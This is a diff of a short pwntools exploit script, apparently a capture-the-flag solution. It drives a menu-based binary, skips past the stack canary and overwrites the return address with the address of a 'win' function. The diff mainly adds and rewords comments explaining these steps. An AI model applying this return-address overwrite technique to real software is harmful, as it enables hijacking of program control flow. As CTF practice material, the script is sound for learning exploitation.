@@ -48,18 +48,19 @@ for j in range(40 - y):
 	io.sendlineafter(b'to write?\n', b'\xff'*32)
 	io.sendlineafter(b': ', b's')
 
-# lets bust out of here, return to the east
+# lets bust out of here, return to the east, navigate to return address
 io.sendlineafter(b'): ', b'x')
 io.sendlineafter(b'?\n', 0x20 * b'\xff')
 io.sendlineafter(b'): ', b'd')
+
+# don't overwirte canary
 io.sendlineafter(b'): ', b'd')
 io.sendlineafter(b'): ', b'x')
 io.sendlineafter(b'?\n', 0x20 * b'\xff')
 io.sendlineafter(b'): ', b'd')
+
+# overwirte return address to the win function
 io.sendlineafter(b'): ', b'x')
-
-
-# 8 bytes before the return address FTW!
 io.sendlineafter(b'?\n', p64(0) + p64(elf.sym.win))
 io.sendlineafter(b'): ', b'q')
 io.stream()
